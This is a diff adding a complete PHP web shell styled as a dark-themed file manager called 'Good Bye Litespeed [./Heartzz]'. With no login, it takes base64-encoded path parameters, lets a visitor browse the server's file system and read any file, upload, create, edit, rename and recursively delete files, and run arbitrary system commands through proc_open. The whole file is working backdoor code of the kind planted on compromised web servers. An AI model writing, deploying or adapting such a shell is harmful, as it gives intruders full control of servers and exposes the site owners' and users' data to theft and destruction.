@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Good Bye Litespeed</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        * {
+            cursor: url(https://ani.cursors-4u.net/cursors/cur-13/cur1161.ani), auto !important;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .modal {
+            transition: opacity 0.3s ease;
+        }
+        .modal-content {
+            transform: scale(0.95);
+            transition: transform 0.3s ease;
+        }
+        .modal:not(.hidden) .modal-content {
+            transform: scale(1);
+        }
+        .table-row {
+            transition: background-color 0.2s ease;
+        }
+        .table-row:hover {
+            background-color: #374151 !important;
+        }
+        .btn {
+            transition: all 0.2s ease;
+        }
+        .btn:hover {
+            transform: translateY(-1px);
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-100 min-h-screen">
+<div class="container mx-auto p-6">
+    <?php
+    $timezone = date_default_timezone_get();
+    date_default_timezone_set($timezone);
+    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
+    $scriptDirectory = dirname(__FILE__);
+
+    function x($b) {
+        return base64_encode($b);
+    }
+
+    function y($b) {
+        return base64_decode($b);
+    }
+
+    foreach ($_GET as $c => $d) $_GET[$c] = y($d);
+
+    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
+    chdir($currentDirectory);
+
+    $viewCommandResult = '';
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        if (isset($_FILES['fileToUpload'])) {
+            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
+            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+                echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">File ' . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . ' Upload success</div>';
+            } else {
+                echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Sorry, there was an error uploading your file.</div>';
+            }
+        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
+            if (!file_exists($newFolder)) {
+                mkdir($newFolder);
+                echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">Folder created successfully!</div>';
+            } else {
+                echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Folder already exists!</div>';
+            }
+        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
+            $fileName = $_POST['file_name'];
+            $newFile = $currentDirectory . '/' . $fileName;
+            if (!file_exists($newFile)) {
+                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                    echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">File created successfully!</div>';
+                } else {
+                    echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Failed to create file!</div>';
+                }
+            } else {
+                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                    echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">File edited successfully!</div>';
+                } else {
+                    echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Failed to edit file!</div>';
+                }
+            }
+        } elseif (isset($_POST['delete_file'])) {
+            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+            if (file_exists($fileToDelete)) {
+                if (is_dir($fileToDelete)) {
+                    if (deleteDirectory($fileToDelete)) {
+                        echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">Folder deleted successfully!</div>';
+                    } else {
+                        echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Failed to delete folder!</div>';
+                    }
+                } else {
+                    if (unlink($fileToDelete)) {
+                        echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">File deleted successfully!</div>';
+                    } else {
+                        echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Failed to delete file!</div>';
+                    }
+                }
+            } else {
+                echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: File or directory not found!</div>';
+            }
+        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+            $oldName = $currentDirectory . '/' . $_POST['old_name'];
+            $newName = $currentDirectory . '/' . $_POST['new_name'];
+            if (file_exists($oldName)) {
+                if (rename($oldName, $newName)) {
+                    echo '<div class="bg-green-500 text-white p-4 rounded-lg mb-4">Item renamed successfully!</div>';
+                } else {
+                    echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Failed to rename item!</div>';
+                }
+            } else {
+                echo '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Item not found!</div>';
+            }
+        } elseif (isset($_POST['cmd_input'])) {
+            $command = $_POST['cmd_input'];
+            $descriptorspec = [
+                0 => ['pipe', 'r'],
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ];
+            $process = proc_open($command, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                $errors = stream_get_contents($pipes[2]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                proc_close($process);
+                if (!empty($errors)) {
+                    $viewCommandResult = '<div class="bg-gray-800 p-4 rounded-lg mb-4"><h3 class="text-lg font-semibold mb-2">Result:</h3><textarea class="w-full p-2 bg-gray-700 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($errors) . '</textarea></div>';
+                } else {
+                    $viewCommandResult = '<div class="bg-gray-800 p-4 rounded-lg mb-4"><h3 class="text-lg font-semibold mb-2">Result:</h3><textarea class="w-full p-2 bg-gray-700 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($output) . '</textarea></div>';
+                }
+            } else {
+                $viewCommandResult = '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: Failed to execute command!</div>';
+            }
+        } elseif (isset($_POST['view_file'])) {
+            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+            if (file_exists($fileToView)) {
+                $fileContent = file_get_contents($fileToView);
+                $viewCommandResult = '<div class="bg-gray-800 p-4 rounded-lg mb-4"><h3 class="text-lg font-semibold mb-2">Result: ' . $_POST['view_file'] . '</h3><textarea class="w-full p-2 bg-gray-700 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($fileContent) . '</textarea></div>';
+            } else {
+                $viewCommandResult = '<div class="bg-red-500 text-white p-4 rounded-lg mb-4">Error: File not found!</div>';
+            }
+        }
+    }
+
+    echo '<header class="mb-8">
+            <div class="flex justify-between items-center">
+                <div>
+                    <h1 class="text-3xl font-bold text-white">Good Bye Litespeed [./Heartzz]</h1>
+                    <p class="text-sm text-gray-400">v.1.3</p>
+                </div>
+                <div class="text-right text-sm">
+                    <p>Server Timezone: ' . $timezone . '</p>
+                    <p>Server Time: ' . date('Y-m-d H:i:s') . '</p>
+                </div>
+            </div>
+        </header>';
+
+    echo '<nav class="bg-gray-800 p-4 rounded-lg mb-6">';
+    echo '<div class="flex items-center space-x-2 text-sm">';
+    echo '<span class="text-gray-400">Path:</span>';
+
+    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+    $currentPath = '';
+    foreach ($directories as $index => $dir) {
+        $currentPath .= DIRECTORY_SEPARATOR . $dir;
+        if ($index == 0) {
+            echo '<a href="?d=' . x($currentPath) . '" class="text-blue-400 hover:text-blue-300">' . $dir . '</a>';
+        } else {
+            echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400 hover:text-blue-300">' . $dir . '</a>';
+        }
+    }
+
+    echo ' / <a href="?d=' . x($scriptDirectory) . '" class="text-green-400 hover:text-green-300">[ GO Home ]</a>';
+    echo '</div>';
+    echo '</nav>';
+
+    echo '<div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">';
+    echo '<button onclick="openModal(\'createFolderModal\')" class="btn w-full p-3 bg-green-600 hover:bg-green-500 text-white rounded-lg shadow-md">Create Folder</button>';
+    echo '<button onclick="openModal(\'createEditFileModal\')" class="btn w-full p-3 bg-blue-600 hover:bg-blue-500 text-white rounded-lg shadow-md">Create / Edit File</button>';
+    echo '<button onclick="openModal(\'uploadFileModal\')" class="btn w-full p-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-lg shadow-md">Upload File</button>';
+    echo '<button onclick="openModal(\'runCommandModal\')" class="btn w-full p-3 bg-red-600 hover:bg-red-500 text-white rounded-lg shadow-md">Run Command</button>';
+    echo '</div>';
+
+    echo $viewCommandResult;
+
+    echo '<div class="bg-gray-800 rounded-lg shadow-lg overflow-hidden">';
+    echo '<div class="overflow-x-auto">';
+    echo '<table class="w-full text-sm">';
+    echo '<thead class="bg-gray-700 text-gray-300">';
+    echo '<tr><th class="px-4 py-3 text-left">Item Name</th><th class="px-4 py-3 text-left">Size</th><th class="px-4 py-3 text-left">Date</th><th class="px-4 py-3 text-left">Permissions</th><th class="px-4 py-3 text-center">View</th><th class="px-4 py-3 text-center">Delete</th><th class="px-4 py-3 text-center">Rename</th></tr>';
+    echo '</thead>';
+    echo '<tbody>';
+    foreach (scandir($currentDirectory) as $v) {
+        $u = realpath($v);
+        $s = stat($u);
+        $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?d=' . x($currentDirectory) . '&f=' . x($v);
+        $permission = substr(sprintf('%o', fileperms($u)), -4);
+        $writable = is_writable($u);
+        echo '<tr class="table-row ' . ($writable ? 'bg-gray-600' : 'bg-gray-700') . '">
+                <td class="px-4 py-3"><a href="' . $itemLink . '" class="text-blue-400 hover:text-blue-300">' . $v . '</a></td>
+                <td class="px-4 py-3">' . filesize($u) . '</td>
+                <td class="px-4 py-3">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>
+                <td class="px-4 py-3">' . $permission . '</td>
+                <td class="px-4 py-3 text-center"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="View" class="btn bg-blue-600 hover:bg-blue-500 text-white rounded-md px-3 py-1"></form></td>
+                <td class="px-4 py-3 text-center"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="Delete" class="btn bg-red-600 hover:bg-red-500 text-white rounded-md px-3 py-1"></form></td>
+                <td class="px-4 py-3"><form method="post" class="flex space-x-2" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="old_name" value="' . htmlspecialchars($v) . '"><input type="text" name="new_name" placeholder="New Name" class="flex-1 p-2 bg-gray-700 text-gray-300 border border-gray-600 rounded-md"><input type="submit" name="rename_item" value="Rename" class="btn bg-yellow-600 hover:bg-yellow-500 text-white rounded-md px-3 py-1"></form></td>
+            </tr>';
+    }
+    echo '</tbody></table></div>';
+    echo '</div>';
+
+    function deleteDirectory($dir) {
+        if (!file_exists($dir)) {
+            return true;
+        }
+        if (!is_dir($dir)) {
+            return unlink($dir);
+        }
+        foreach (scandir($dir) as $item) {
+            if ($item == '.' || $item == '..') {
+                continue;
+            }
+            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+                return false;
+            }
+        }
+        return rmdir($dir);
+    }
+    ?>
+</div>
+
+<!-- Create Folder Modal -->
+<div id="createFolderModal" class="modal fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="modal-content bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
+        <h2 class="text-xl font-semibold mb-4">Create Folder</h2>
+        <form method="post">
+            <input type="text" name="folder_name" placeholder="Folder Name" class="w-full p-3 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500">
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('createFolderModal')" class="btn w-full p-3 bg-red-600 hover:bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" class="btn w-full p-3 bg-green-600 hover:bg-green-500 text-white rounded-md">Create</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Create / Edit File Modal -->
+<div id="createEditFileModal" class="modal fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="modal-content bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
+        <h2 class="text-xl font-semibold mb-4">Create / Edit File</h2>
+        <form method="post">
+            <input type="text" name="file_name" placeholder="File Name" class="w-full p-3 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <textarea name="file_content" placeholder="File Content" class="w-full p-3 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 h-32"></textarea>
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('createEditFileModal')" class="btn w-full p-3 bg-red-600 hover:bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" class="btn w-full p-3 bg-blue-600 hover:bg-blue-500 text-white rounded-md">Save</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Upload File Modal -->
+<div id="uploadFileModal" class="modal fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="modal-content bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
+        <h2 class="text-xl font-semibold mb-4">Upload File</h2>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="fileToUpload" id="fileToUpload" class="w-full p-3 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-500">
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('uploadFileModal')" class="btn w-full p-3 bg-red-600 hover:bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" name="submit" class="btn w-full p-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md">Upload</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Run Command Modal -->
+<div id="runCommandModal" class="modal fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
+    <div class="modal-content bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
+        <h2 class="text-xl font-semibold mb-4">Run Command</h2>
+        <form method="post">
+            <input type="text" name="cmd_input" placeholder="Enter command" class="w-full p-3 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500">
+            <div class="flex space-x-4">
+                <button type="button" onclick="closeModal('runCommandModal')" class="btn w-full p-3 bg-red-600 hover:bg-red-500 text-white rounded-md">Cancel</button>
+                <button type="submit" class="btn w-full p-3 bg-red-600 hover:bg-red-500 text-white rounded-md">Run</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+    function openModal(modalId) {
+        document.getElementById(modalId).classList.remove('hidden');
+    }
+
+    function closeModal(modalId) {
+        document.getElementById(modalId).classList.add('hidden');
+    }
+</script>
+</body>
+</html>
